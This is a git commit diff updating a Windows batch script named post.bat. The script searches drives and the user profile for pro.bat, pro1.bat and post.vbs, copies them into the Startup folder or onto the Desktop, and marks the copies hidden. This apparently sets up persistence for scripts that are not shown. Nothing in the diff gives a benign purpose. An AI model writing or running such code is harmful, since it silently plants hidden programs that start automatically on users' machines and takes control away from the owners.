38a3edd17dc404b2df527fd77a22cc33848ef2cb
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 19:13:45 +0300

    Update post.bat

--- post.bat
+++ post.bat
@@ -1,11 +1,13 @@
+@echo off
+set "desktop_dir=%USERPROFILE%\Desktop"
 for /R "D:\" %%i in (pro.bat) do (
-    copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+    copy "%%i" "%desktop_dir%"
 )
-
+attrib +h %desktop_dir%/pro.bat
 for /R "%USERPROFILE%" %%i in (pro1.bat) do (
     copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 )
-
+attrib +h %desktop_dir%/pro1.bat
 for /R "%USERPROFILE%" %%i in (post.vbs) do (
     copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 )
